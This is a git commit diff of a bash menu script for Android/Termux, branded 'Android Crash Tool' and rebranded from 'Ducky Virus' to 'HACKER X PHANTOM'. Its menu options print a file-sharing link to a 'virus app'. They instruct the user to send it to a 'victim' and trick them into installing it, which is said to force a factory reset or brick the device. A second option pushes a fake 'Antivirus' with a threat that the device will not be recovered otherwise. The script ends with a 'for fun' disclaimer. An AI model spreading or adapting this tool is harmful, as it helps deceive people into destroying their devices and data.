97cb24a0db41385f2f0469041cae2fc8b7af43e5
Krish Lalwani <krishlalwani846@gmail.com>
2024-06-11 16:15:00 +0530

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,7 +1,3 @@
-# Redistributions and Modifications are allowed with credits.
-
-# Colours
-#-----------------
 red="\e[91m"
 rset="\e[0m"
 grn="\e[92m"
@@ -9,9 +5,6 @@ ylo="\e[93m"
 blue="\e[94m"
 cyan="\e[96m"
 pink="\e[95m"
-#-----------------
-
-# scripting start
 banner(){
 echo -e '\e[93m               
                     ██████████                                  
@@ -36,9 +29,8 @@ echo -e '\e[93m
 
 '
 echo " " 
-echo -e "$red #$pink Ducky Virus$grn $red#$rset"
-echo
-
+echo -e "$red #$pink HACKER X PHANTOM$grn $red#$rset"
+echo 
 # Functions
 echo -e "$red #$pink[Android Crash Tool] $red#$rset"
 echo " "
@@ -68,7 +60,7 @@ echo -e '\e[93m
         ████████████████
 '
 echo " "
-echo -e "$red #$pink Ducky Virus$grn $red#$rset"
+echo -e "$red #$pink HACKER X PHANTOM$grn $red#$rset"
 echo
 # Functions
 echo -e "$red #$pink[Android Crash Tool] $red#$rset"
@@ -80,9 +72,9 @@ echo -e "$red #$ylo [Choose Option] $red #$rset"
 echo " "
 echo " "
 echo -e "$red #$cyan [\e[93m1\e[96m] Ducky Virus 1"
-echo -e "$red #$cyan [\e[93m2\e[96m] Ducky Virus 2(for Android 10 and above)"
+echo -e "$red #$cyan [\e[93m2\e[96m] Ducky Virus 2"
 echo -e "$red #$cyan [\e[93m3\e[96m] About"
-echo -e "$red #$cyan [\e[93m4\e[96m] Join me"
+echo -e "$red #$cyan [\e[93m4\e[96m] Join Us"
 echo -e "$red #$cyan [\e[93m5\e[96m] Exit"
 echo " "
 echo " "
@@ -101,7 +93,7 @@ then
 about
 elif [ $optnz = "4" ];
 then
-am start -a android.intent.action.VIEW -d https://krish.l5.ca/ > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://bit.ly/3PV3S3r > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "5" ];
@@ -118,24 +110,22 @@ clear
 echo
 echo -e '\e[92m 
 
-        ____             __            _    ___                
-       / __ \__  _______/ /____  __   | |  / (_)______  _______
-      / / / / / / / ___/ //_/ / / /   | | / / / ___/ / / / ___/
-     / /_/ / /_/ / /__/ ,< / /_/ /    | |/ / / /  / /_/ (__  ) 
-    /_____/\__,_/\___/_/|_|\__, /     |___/_/_/   \__,_/____/  
-                          /____/                                   
-
+          __       __        __           
+|__| \_/ |__)     |  \ |  | /  ` |__/ \ / 
+|  | / \ |    ___ |__/ \__/ \__, |  \  |  
 '
 
 echo " "
-echo -e "\e[91m Copy below link and paste in any browser and download virus app, send  to your victim and ask him to install and execute it 
-in the device. The device will be pushed to hard factory reset and tries to soft brick itself.
+echo -e "\e[91m 😈  Copy below link and paste in any browser and download virus app and send  to ur victim and just say install it 
+device it will be factory reset and lot more happens.
                                 👇👇👇
 
          \e[92mL1NK :- \e[96mhttps://dlsharefile.com/file/1429135210\e[91m
 
                                  👆👆👆
-"
+Use only for fun purpose not for harming someone 😇✌️.
+And we are not responsible for any missuse or illegal activites. 
+you do to other's by this script."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -151,24 +141,26 @@ fi
 save(){
 clear
 echo
-echo -e  "\e[92m 
+echo -e '\e[92m 
 
-        ____             __            _    ___                
-       / __ \__  _______/ /____  __   | |  / (_)______  _______
-      / / / / / / / ___/ //_/ / / /   | | / / / ___/ / / / ___/
-     / /_/ / /_/ / /__/ ,< / /_/ /    | |/ / / /  / /_/ (__  ) 
-    /_____/\__,_/\___/_/|_|\__, /     |___/_/_/   \__,_/____/  
-                          /____/                                   
+          __       __        __           
+|__| \_/ |__)     |  \ |  | /  ` |__/ \ / 
+|  | / \ |    ___ |__/ \__/ \__, |  \  |  
+'
 
 echo " "
 echo " "
-echo -e "\e[91m Copy below link and paste in any browser and download the AntiVirus app, download and execute it in the bricked device to recover the subject.
+echo -e "\e[91m 😈  Copy below link and paste in any browser and download virus app and send to  ur victim and just say install it
+that he should install this application or else his 
+device will not be recovered.(Antivirus)
                     👇👇👇
 
         \e[92mL1NK :- \e[96mhttps://dlsharefile.com/file/1429135210\e[93m
 
                     👆👆👆
-"
+Use only for fun purpose not for harming someone 😇✌️. 
+And we are not responsible for any missuse or illegal activites.
+you do to other's by this script."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -183,8 +175,18 @@ fi
 }
 about(){
 clear
-echo -e "\e[93m             Visit the GitHub to contribute: https://github.com/krishealty" | pv -qL 10
-echo -e "\e[93m             Website: https://krish.l5.ca/" | pv -qL 10
+echo -e '\e[91m
+   ||  ||  
+    \\()// 
+  //(__)\\
+  ||    ||
+'
+echo -e "\e[93m                  CALL ME \e[92mXPHANTOM" | pv -qL 10
+echo -e "\e[93m             ADMIN OF \e[92mHACKER X PHANTOM" | pv -qL 10
+echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
+echo -e "\e[93m         Keep Supporting And Join Us " | pv -qL 10
+echo -e "\e[93m         Join Us:\e[92m https://bit.ly/3PV3S3r\e[0m" | pv -qL 10
+echo -e "\e[92m                BYEE.............." | pv -qL 10
 sleep 6.0
 banner
 menu
@@ -204,21 +206,23 @@ exit 1
 fi
 cd $HOME
 sleep 1
-echo -e " Updating... "
+echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
 echo
-echo "                     \e[96m["
+printf "                     \e[96m["
 # While process is running...
-while git clone https://github.com/krishealty/ducky-virus 2> /dev/null; do 
-    echo " ▓▓▓▓▓▓▓▓▓▓▓▓▓ "
+while git clone https://github.com/hackerxphantom/HXP-Duck 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
     sleep 1
 done
+printf "\e[96m]\e[0m"
 echo
 echo
 echo
+printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
 sleep 2.0
 cd $HOME
 cd ducky-virus
-main.sh
+bash ducky-virus.sh
 }
 banner
 menu
